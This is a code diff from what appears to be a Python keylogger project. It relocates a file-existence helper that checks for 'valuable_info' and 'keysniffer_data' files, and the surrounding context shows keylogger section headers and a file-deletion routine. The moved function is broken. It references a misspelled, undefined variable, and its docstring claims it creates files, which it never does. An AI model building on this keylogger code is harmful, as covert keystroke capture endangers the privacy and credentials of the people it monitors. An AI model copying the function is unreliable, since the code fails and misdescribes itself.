@@ -1,3 +1,25 @@
+# ===================================================== File Existence Handling =====================================================
+
+
+def check_and_create_file(valuable_info, keysniffer_data, retries=3, delay=2):
+    """Check if the files exist, and create them if not, retrying a few times if they fail."""
+    for attempt in range(retries):
+        # Check if both files exist
+        if os.path.exists(valuable_info) and os.path.exists(keysneffer_data):
+            return True
+        else:
+            print(
+                f"Files not found: {valuable_info}, {keysniffer_data}. Retrying {attempt + 1}/{retries}..."
+            )
+            time.sleep(delay)
+            if attempt == retries - 1:
+                print(
+                    f"Failed to find or create files: {valuable_info}, {keysniffer_data}"
+                )
+                return False
+    return False
+
+
 # ===================================================== Basic keylogger ================================================
 
 import keyboard
@@ -171,28 +193,6 @@ def delete_all_files():
                 print(f"Deleted: {file_path}")
     except Exception as e:
         print(f"An error occurred while deleting files: {e}")
-
-
-# ===================================================== File Existence Handling =====================================================
-
-
-def check_and_create_file(valuable_info, keysniffer_data, retries=3, delay=2):
-    """Check if the files exist, and create them if not, retrying a few times if they fail."""
-    for attempt in range(retries):
-        # Check if both files exist
-        if os.path.exists(valuable_info) and os.path.exists(keysneffer_data):
-            return True
-        else:
-            print(
-                f"Files not found: {valuable_info}, {keysniffer_data}. Retrying {attempt + 1}/{retries}..."
-            )
-            time.sleep(delay)
-            if attempt == retries - 1:
-                print(
-                    f"Failed to find or create files: {valuable_info}, {keysniffer_data}"
-                )
-                return False
-    return False
 
 
 # ===================================================== Running the Program ======================================================
